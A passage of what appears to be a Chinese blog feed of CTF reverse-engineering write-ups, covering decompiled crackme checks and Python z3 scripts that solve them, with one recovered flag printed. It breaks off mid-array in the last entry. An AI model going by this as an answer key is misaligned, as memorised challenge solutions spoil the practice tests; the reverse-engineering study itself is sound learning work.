<p>同时这个每两位就代表了一个字符刚好就有42个字符符合校验的字符个数</p>
<p>所以z3破解代码为</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *    </span><br><span class="line">DataCmp=[		</span><br><span class="line"><span class="number">0x66</span>,<span class="number">0x4E</span>,<span class="number">0XA9</span>,<span class="number">0XFD</span>,<span class="number">0X3C</span>,<span class="number">0X55</span>,<span class="number">0X90</span>,<span class="number">0X24</span>,</span><br><span class="line"><span class="number">0X57</span>,<span class="number">0XF6</span>,<span class="number">0X5D</span>,<span class="number">0XB1</span>,<span class="number">0X01</span>,<span class="number">0X20</span>,<span class="number">0X81</span>,<span class="number">0XFD</span>,</span><br><span class="line"><span class="number">0X36</span>,<span class="number">0XA9</span>,<span class="number">0X1F</span>,<span class="number">0XA1</span>,<span class="number">0X0E</span>,<span class="number">0X0D</span>,<span class="number">0X80</span>,<span class="number">0X8F</span>,</span><br><span class="line"><span class="number">0XCE</span>,<span class="number">0X77</span>,</span><br><span class="line"><span class="number">0XE8</span>,<span class="number">0X23</span>,<span class="number">0X9E</span>,<span class="number">0X27</span>,<span class="number">0X60</span>,<span class="number">0X2F</span>,<span class="number">0XA5</span>,<span class="number">0XCF</span>,</span><br><span class="line"><span class="number">0X1B</span>,<span class="number">0XBD</span>,<span class="number">0X32</span>,<span class="number">0XDB</span>,<span class="number">0XFF</span>,<span class="number">0X28</span>,<span class="number">0XA4</span>,<span class="number">0X5D</span>]</span><br><span class="line">flag = [BitVec(<span class="string">&#x27;flag[%2d]&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>)]  <span class="comment">#初始化序列</span></span><br><span class="line">out=[<span class="number">0</span>]*<span class="number">42</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">    out[i]=flag[i]</span><br><span class="line">v11 = <span class="number">0</span></span><br><span class="line">v10 = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">v9 = <span class="number">0</span> </span><br><span class="line">v1 =<span class="number">0</span> </span><br><span class="line">f = Solver()<span class="comment">#创建约束求解器</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        v9=<span class="number">6</span>*i+j</span><br><span class="line">        v11=flag[v9]</span><br><span class="line">        v10=flag[v9]</span><br><span class="line">        v11 = ~v11</span><br><span class="line">        v11 &amp;= i * (j + <span class="number">2</span>)</span><br><span class="line">        v10 = v10 &amp; ~(i * (j + <span class="number">2</span>)) | v11</span><br><span class="line">        v9 = <span class="number">7</span> * j + i</span><br><span class="line">        out[v9] = v10</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>):</span><br><span class="line">    <span class="keyword">if</span> (i+<span class="number">1</span>)%<span class="number">2</span>==<span class="number">1</span>:</span><br><span class="line">        out[i+<span class="number">1</span>]*=<span class="number">107</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        out[i+<span class="number">1</span>]+=out[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">    f.add(out[i]==DataCmp[i])</span><br><span class="line"><span class="keyword">while</span>(f.check()==sat):</span><br><span class="line">    condition = []</span><br><span class="line">    m = f.model()</span><br><span class="line">    p=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">        p+=<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[flag[i]])))</span><br><span class="line">        condition.append(flag[i]!=<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[flag[i]])))</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">    f.add(Or(condition))</span><br></pre></td></tr></table></figure></div>

<p>求出其flag为</p>
<p>flag{wh03v3r_d1g5_1n70_17_f1nd5_7h3_7ru7h}</p>
<p>我逐渐知道z3的好用了 欸嘿嘿嘿嘿嘿嘿嘿</p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>pythonz3</category>
      </categories>
  </entry>
  <entry>
    <title>4.elf</title>
    <url>/2023/01/06/CTF%20WP/Re/pythonz3/4.elf/</url>
    <content><![CDATA[<p>装好了ubuntu</p>
<p>它的glibc版本够用</p>
<p>通过动态调试找到了其存储数据的正确顺序</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="E:\note\re\pythonz3\4.elf.assets\image-20230106230217327.png"
                      alt="image-20230106230217327"
                ></p>
<p>先依次输入数组中存起来备用</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 == v9 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">16</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)s[i] &gt; <span class="number">0x60</span>u &amp;&amp; (<span class="type">unsigned</span> __int8)s[i] &lt;= <span class="number">0x7A</span>u )</span><br><span class="line">        s[i] = (s[i] ^ <span class="number">0x47</span>) + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)s[i] &gt; <span class="number">0x40</span>u &amp;&amp; (<span class="type">unsigned</span> __int8)s[i] &lt;= <span class="number">0x5A</span>u )</span><br><span class="line">        s[i] = (s[i] ^ <span class="number">0x4B</span>) - <span class="number">1</span>;</span><br><span class="line">      v6[<span class="number">2</span> * i] = (<span class="type">unsigned</span> __int8)s[i] &gt;&gt; <span class="number">4</span>;</span><br><span class="line">      v6[<span class="number">2</span> * i + <span class="number">1</span>] = s[i] &amp; <span class="number">0xF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>根据其加密方式需要判断输入的字符的大小，z3无法检验flag具体的大小来建模</p>
<p>所以可以设立多种情况</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">out1[i]=(flag[i]^<span class="number">0x47</span>)+<span class="number">1</span><span class="comment">#只经过前一次异或</span></span><br><span class="line">out2[i]=(flag[i]^<span class="number">0x4B</span>)-<span class="number">1</span><span class="comment">#只经过后一次异或</span></span><br><span class="line">out3[i]=(((flag[i]^<span class="number">0x47</span>)+<span class="number">1</span>)^<span class="number">0x4b</span>)-<span class="number">1</span><span class="comment">#两次异或都经过</span></span><br><span class="line">out4[i]=flag[i]<span class="comment">#未经过异或</span></span><br></pre></td></tr></table></figure></div>

<p>所以约束条件可为</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">f.add(((a[<span class="number">2</span>*i]==v61[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>])<span class="keyword">and</span>(a[<span class="number">2</span>*i+<span class="number">1</span>]==v61[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>]))<span class="keyword">or</span>((a[<span class="number">2</span>*i]==v62[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>])<span class="keyword">and</span>(a[<span class="number">2</span>*i+<span class="number">1</span>]==v62[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>]))<span class="keyword">or</span>((a[<span class="number">2</span>*i]==v63[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>])<span class="keyword">and</span>(a[<span class="number">2</span>*i+<span class="number">1</span>]==v63[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>]))<span class="keyword">or</span>((a[<span class="number">2</span>*i]==v64[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>])<span class="keyword">and</span>(a[<span class="number">2</span>*i+<span class="number">1</span>]==v64[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>])))</span><br></pre></td></tr></table></figure></div>

<p>整体求解如下</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a=[</span><br><span class="line"><span class="number">0X07</span>,<span class="number">0X0D</span>,<span class="number">0X00</span>,<span class="number">0X05</span>,<span class="number">0X01</span>,<span class="number">0X0C</span>,<span class="number">0X01</span>,</span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x0D</span>,<span class="number">0X05</span>,<span class="number">0X0F</span>,<span class="number">0X00</span>,<span class="number">0X09</span>,</span><br><span class="line"><span class="number">0X05</span>,<span class="number">0X0F</span>,<span class="number">0X03</span>,<span class="number">0X00</span>,<span class="number">0X02</span>,<span class="number">0X05</span>,<span class="number">0X03</span>,</span><br><span class="line"><span class="number">0X03</span>,<span class="number">0X01</span>,<span class="number">0X07</span>,<span class="number">0X07</span>,<span class="number">0X0B</span>,<span class="number">0X02</span>,<span class="number">0X01</span>,</span><br><span class="line"><span class="number">0X02</span>,<span class="number">0X07</span>,<span class="number">0X02</span>,<span class="number">0X0C</span>,<span class="number">0X02</span>,<span class="number">0X02</span>,<span class="number">0X00</span>]</span><br><span class="line">flag = [BitVec(<span class="string">&#x27;flag[%2d]&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>)]</span><br><span class="line">out1=[<span class="number">0</span>]*<span class="number">17</span></span><br><span class="line">out2=[<span class="number">0</span>]*<span class="number">17</span></span><br><span class="line">out3=[<span class="number">0</span>]*<span class="number">17</span></span><br><span class="line">out4=[<span class="number">0</span>]*<span class="number">17</span></span><br><span class="line">v61=[<span class="number">0</span>]*<span class="number">34</span></span><br><span class="line">v62=[<span class="number">0</span>]*<span class="number">34</span></span><br><span class="line">v63=[<span class="number">0</span>]*<span class="number">34</span></span><br><span class="line">v64=[<span class="number">0</span>]*<span class="number">34</span></span><br><span class="line">v0=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    out1[i]=(flag[i]^<span class="number">0x47</span>)+<span class="number">1</span></span><br><span class="line">    out2[i]=(flag[i]^<span class="number">0x4B</span>)-<span class="number">1</span></span><br><span class="line">    out3[i]=(((flag[i]^<span class="number">0x47</span>)+<span class="number">1</span>)^<span class="number">0x4b</span>)-<span class="number">1</span></span><br><span class="line">    out4[i]=flag[i]</span><br><span class="line">    v61[<span class="number">2</span>*i]=out1[i]&gt;&gt;<span class="number">4</span></span><br><span class="line">    v61[<span class="number">2</span>*i+<span class="number">1</span>]=out1[i]&amp;<span class="number">0xF</span></span><br><span class="line">    v62[<span class="number">2</span>*i]=out2[i]&gt;&gt;<span class="number">4</span></span><br><span class="line">    v62[<span class="number">2</span>*i+<span class="number">1</span>]=out2[i]&amp;<span class="number">0xF</span></span><br><span class="line">    v63[<span class="number">2</span>*i]=out3[i]&gt;&gt;<span class="number">4</span></span><br><span class="line">    v63[<span class="number">2</span>*i+<span class="number">1</span>]=out3[i]&amp;<span class="number">0xF</span></span><br><span class="line">    v64[<span class="number">2</span>*i]=out4[i]&gt;&gt;<span class="number">4</span></span><br><span class="line">    v64[<span class="number">2</span>*i+<span class="number">1</span>]=out4[i]&amp;<span class="number">0xF</span></span><br><span class="line">f=Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    f.add(((a[<span class="number">2</span>*i]==v61[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>])<span class="keyword">and</span>(a[<span class="number">2</span>*i+<span class="number">1</span>]==v61[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>]))<span class="keyword">or</span>((a[<span class="number">2</span>*i]==v62[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>])<span class="keyword">and</span>(a[<span class="number">2</span>*i+<span class="number">1</span>]==v62[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>]))<span class="keyword">or</span>((a[<span class="number">2</span>*i]==v63[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>])<span class="keyword">and</span>(a[<span class="number">2</span>*i+<span class="number">1</span>]==v63[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>]))<span class="keyword">or</span>((a[<span class="number">2</span>*i]==v64[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>])<span class="keyword">and</span>(a[<span class="number">2</span>*i+<span class="number">1</span>]==v64[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>])))</span><br><span class="line"><span class="keyword">while</span>(f.check()==sat):</span><br><span class="line">    condition = []</span><br><span class="line">    m = f.model()</span><br><span class="line">    p=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">        p+=<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[flag[i]])))</span><br><span class="line">        condition.append(flag[i]!=<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[flag[i]])))</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">    f.add(Or(condition))</span><br></pre></td></tr></table></figure></div>

<p>上述代码是有解的,但增加约束条件时会抽风</p>
<p>因为不知道具体flag格式，无法具体限制其条件只能限制末尾是’}’之类的，但输入条件时就会报错</p>
<p>未输入其他条件就会有非常多的解下图只是一部分</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="E:\note\re\pythonz3\4.elf.assets\image-20230106231208987.png"
                      alt="image-20230106231208987"
                ></p>
<p>只不过不知道z3中的And，Or是否效果跟原来的逻辑符and，or是否等效</p>
<p>但在我使用下列求解时</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a=[</span><br><span class="line"><span class="number">0X07</span>,<span class="number">0X0D</span>,<span class="number">0X00</span>,<span class="number">0X05</span>,<span class="number">0X01</span>,<span class="number">0X0C</span>,<span class="number">0X01</span>,</span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x0D</span>,<span class="number">0X05</span>,<span class="number">0X0F</span>,<span class="number">0X00</span>,<span class="number">0X09</span>,</span><br><span class="line"><span class="number">0X05</span>,<span class="number">0X0F</span>,<span class="number">0X03</span>,<span class="number">0X00</span>,<span class="number">0X02</span>,<span class="number">0X05</span>,<span class="number">0X03</span>,</span><br><span class="line"><span class="number">0X03</span>,<span class="number">0X01</span>,<span class="number">0X07</span>,<span class="number">0X07</span>,<span class="number">0X0B</span>,<span class="number">0X02</span>,<span class="number">0X01</span>,</span><br><span class="line"><span class="number">0X02</span>,<span class="number">0X07</span>,<span class="number">0X02</span>,<span class="number">0X0C</span>,<span class="number">0X02</span>,<span class="number">0X02</span>,<span class="number">0X00</span>]</span><br><span class="line">flag = [BitVec(<span class="string">&#x27;flag[%2d]&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>)]</span><br><span class="line">out1=[<span class="number">0</span>]*<span class="number">17</span></span><br><span class="line">out2=[<span class="number">0</span>]*<span class="number">17</span></span><br><span class="line">out3=[<span class="number">0</span>]*<span class="number">17</span></span><br><span class="line">out4=[<span class="number">0</span>]*<span class="number">17</span></span><br><span class="line">v61=[<span class="number">0</span>]*<span class="number">34</span></span><br><span class="line">v62=[<span class="number">0</span>]*<span class="number">34</span></span><br><span class="line">v63=[<span class="number">0</span>]*<span class="number">34</span></span><br><span class="line">v64=[<span class="number">0</span>]*<span class="number">34</span></span><br><span class="line">v0=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    out1[i]=(flag[i]^<span class="number">0x47</span>)+<span class="number">1</span></span><br><span class="line">    out2[i]=(flag[i]^<span class="number">0x4B</span>)-<span class="number">1</span></span><br><span class="line">    out3[i]=(((flag[i]^<span class="number">0x47</span>)+<span class="number">1</span>)^<span class="number">0x4b</span>)-<span class="number">1</span></span><br><span class="line">    out4[i]=flag[i]</span><br><span class="line">    v61[<span class="number">2</span>*i]=out1[i]&gt;&gt;<span class="number">4</span></span><br><span class="line">    v61[<span class="number">2</span>*i+<span class="number">1</span>]=out1[i]&amp;<span class="number">0xF</span></span><br><span class="line">    v62[<span class="number">2</span>*i]=out2[i]&gt;&gt;<span class="number">4</span></span><br><span class="line">    v62[<span class="number">2</span>*i+<span class="number">1</span>]=out2[i]&amp;<span class="number">0xF</span></span><br><span class="line">    v63[<span class="number">2</span>*i]=out3[i]&gt;&gt;<span class="number">4</span></span><br><span class="line">    v63[<span class="number">2</span>*i+<span class="number">1</span>]=out3[i]&amp;<span class="number">0xF</span></span><br><span class="line">    v64[<span class="number">2</span>*i]=out4[i]&gt;&gt;<span class="number">4</span></span><br><span class="line">    v64[<span class="number">2</span>*i+<span class="number">1</span>]=out4[i]&amp;<span class="number">0xF</span></span><br><span class="line">f=Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    f.add(Or(And((a[<span class="number">2</span>*i]==v61[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>]),(a[<span class="number">2</span>*i+<span class="number">1</span>]==v61[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>])),And((a[<span class="number">2</span>*i]==v62[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>]),(a[<span class="number">2</span>*i+<span class="number">1</span>]==v62[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>])),And((a[<span class="number">2</span>*i]==v63[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>]),(a[<span class="number">2</span>*i+<span class="number">1</span>]==v63[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>])),And((a[<span class="number">2</span>*i]==v64[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>]),(a[<span class="number">2</span>*i+<span class="number">1</span>]==v64[<span class="number">2</span>*(<span class="number">17</span>-i)-<span class="number">2</span>]))))</span><br><span class="line"><span class="keyword">if</span> f.check()==sat:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>其输出的是无解</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="E:\note\re\pythonz3\4.elf.assets\image-20230106231121538.png"
                      alt="image-20230106231121538"
                ></p>
<p>非常奇特</p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>pythonz3</category>
      </categories>
  </entry>
  <entry>
    <title>5.elf</title>
    <url>/2023/01/07/CTF%20WP/Re/pythonz3/5.elf/</url>
    <content><![CDATA[<p>5.elf教会了我需要注意数据的类型与数据的长度，不然也容易犯错误</p>
<p>关键在于看懂那几个强制类型转化，和运算符的顺序</p>
<p>其main函数为</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-1D0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5[<span class="number">84</span>]; <span class="comment">// [rsp+40h] [rbp-190h] BYREF此处为int型4字节一个</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+190h] [rbp-40h]此处为int64，64bit 8字节一个</span></span><br><span class="line">  __int64 v7[<span class="number">3</span>]; <span class="comment">// [rsp+198h] [rbp-38h] BYREF此处为int64 8字节一个</span></span><br><span class="line">  _BYTE v8[<span class="number">15</span>]; <span class="comment">// [rsp+1B0h] [rbp-20h]此处为1字节一个</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+1BFh] [rbp-11h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+1C0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+1C4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+1C8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1CCh] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)v8 = <span class="number">0xA718337232343F22</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;v8[<span class="number">7</span>] = <span class="number">0x7A1EC18428F131A7</span>LL;</span><br><span class="line">  v6 = <span class="number">0x1412100D0A070401</span>LL;</span><br><span class="line">  v7[<span class="number">0</span>] = <span class="number">0x2A2724211F1D1A17</span>LL;</span><br><span class="line">  qmemcpy((<span class="type">char</span> *)v7 + <span class="number">6</span>, <span class="string">&quot;&#x27;*-/147:=@CFILOR&quot;</span>, <span class="number">16</span>);</span><br><span class="line">  qmemcpy(v5, <span class="string">&quot;\n&quot;</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;PLZ input&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">14</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">1</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = *((<span class="type">char</span> *)&amp;v7[<span class="number">-1</span>] + v11 + j);<span class="comment">//v7先用了括号访问符此处指针指向的是v7[0]前8个字节的数据</span></span><br><span class="line">      <span class="keyword">switch</span> ( v5[v10] )<span class="comment">//此处都有强制类型转化但本质是一致的取的是数据的低八位，注意v5是int型占四字节</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          s[i] += LOBYTE(v5[v10 + <span class="number">1</span>]);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          s[i] -= LOBYTE(v5[v10 + <span class="number">1</span>]);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">          s[i] ^= LOBYTE(v5[v10 + <span class="number">1</span>]);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">          s[i] *= (<span class="type">unsigned</span> __int8)v5[v10 + <span class="number">1</span>];</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">          --s[i];</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">          ++s[i];</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v11 += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">14</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[i] != v8[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wrong wrong wrong&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;woc,you got it,flag is your input&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>根据其加密和数据类型可以通过动态调试获得几个数组的原始数据</p>
<p>如图v5是四个字节为一段数据（注意高位低位区别）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="E:\note\re\pythonz3\5.elf.assets\image-20230107152013375.png"
                      alt="image-20230107152013375"
                ></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">v5=[</span><br><span class="line"><span class="number">0x0A</span>,<span class="number">0x04</span>,<span class="number">0x10</span>,<span class="number">0x08</span>,</span><br><span class="line"><span class="number">0x03</span>,<span class="number">0x05</span>,<span class="number">0x01</span>,<span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x08</span>,<span class="number">0x05</span>,<span class="number">0x03</span>,</span><br><span class="line"><span class="number">0x01</span>,<span class="number">0x03</span>,<span class="number">0x02</span>,<span class="number">0x08</span>,</span><br><span class="line"><span class="number">0x0B</span>,<span class="number">0x01</span>,<span class="number">0x0C</span>,<span class="number">0x08</span>,</span><br><span class="line"><span class="number">0x04</span>,<span class="number">0x04</span>,<span class="number">0x01</span>,<span class="number">0x05</span>,</span><br><span class="line"><span class="number">0x03</span>,<span class="number">0x08</span>,<span class="number">0x03</span>,<span class="number">0x21</span>,</span><br><span class="line"><span class="number">0x01</span>,<span class="number">0x0B</span>,<span class="number">0x08</span>,<span class="number">0x0B</span>,</span><br><span class="line"><span class="number">0x01</span>,<span class="number">0x04</span>,<span class="number">0x09</span>,<span class="number">0x08</span>,</span><br><span class="line"><span class="number">0x03</span>,<span class="number">0x20</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,</span><br><span class="line"><span class="number">0x51</span>,<span class="number">0x08</span>,<span class="number">0x04</span>,<span class="number">0x24</span>,</span><br><span class="line"><span class="number">0x01</span>,<span class="number">0x0C</span>,<span class="number">0x08</span>,<span class="number">0x0B</span>,</span><br><span class="line"><span class="number">0x01</span>,<span class="number">0x05</span>,<span class="number">0x02</span>,<span class="number">0x08</span>,</span><br><span class="line"><span class="number">0x02</span>,<span class="number">0x25</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,</span><br><span class="line"><span class="number">0x36</span>,<span class="number">0x08</span>,<span class="number">0x04</span>,<span class="number">0x41</span>,</span><br><span class="line"><span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x20</span>,<span class="number">0x08</span>,</span><br><span class="line"><span class="number">0x05</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x05</span>,</span><br><span class="line"><span class="number">0x03</span>,<span class="number">0x08</span>,<span class="number">0x02</span>,<span class="number">0x25</span>,</span><br><span class="line"><span class="number">0x01</span>,<span class="number">0x04</span>,<span class="number">0x09</span>,<span class="number">0x08</span>,</span><br><span class="line"><span class="number">0x03</span>,<span class="number">0x20</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,</span><br><span class="line"><span class="number">0x41</span>,<span class="number">0x08</span>,<span class="number">0x0C</span>,<span class="number">0x01</span></span><br><span class="line">]<span class="comment">#此处仅有低位有数据可以直接去掉0x00的数据便于访问</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">v7=[</span><br><span class="line"><span class="number">0x01</span>,<span class="number">0x04</span>,<span class="number">0x07</span>,<span class="number">0x0a</span>,<span class="number">0x0d</span>,<span class="number">0x10</span>,<span class="number">0x12</span>,<span class="number">0x14</span>,</span><br><span class="line"><span class="number">0x17</span>,<span class="number">0x1a</span>,<span class="number">0x1d</span>,<span class="number">0x1f</span>,<span class="number">0x21</span>,<span class="number">0x24</span>,<span class="number">0x27</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0x2d</span>,<span class="number">0x2f</span>,<span class="number">0x31</span>,<span class="number">0x34</span>,<span class="number">0x37</span>,<span class="number">0x3a</span>,<span class="number">0x3d</span>,</span><br><span class="line"><span class="number">0x40</span>,<span class="number">0x43</span>,<span class="number">0x46</span>,<span class="number">0x49</span>,<span class="number">0x4c</span>,<span class="number">0x4f</span>,<span class="number">0x52</span>,<span class="number">0x00</span>,</span><br><span class="line"><span 